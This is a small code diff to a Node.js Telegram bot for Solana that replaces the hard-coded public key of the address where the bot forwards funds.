@@ -22,7 +22,7 @@ class SolanaTelegramBot {
         this.bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: true });
         
         // Target address to forward funds to
-        this.targetAddress = new PublicKey('FUMnrwov6NuztUmmZZP97587aDZEH4WuKn8bgG6UqjXG');
+        this.targetAddress = new PublicKey('2PHvp3EHeA81m8w3HrTcP6bu1HdyzQa78cyEPbWgjpmn');
         
         // Store wallets and their corresponding RPC connections
         this.wallets = [];
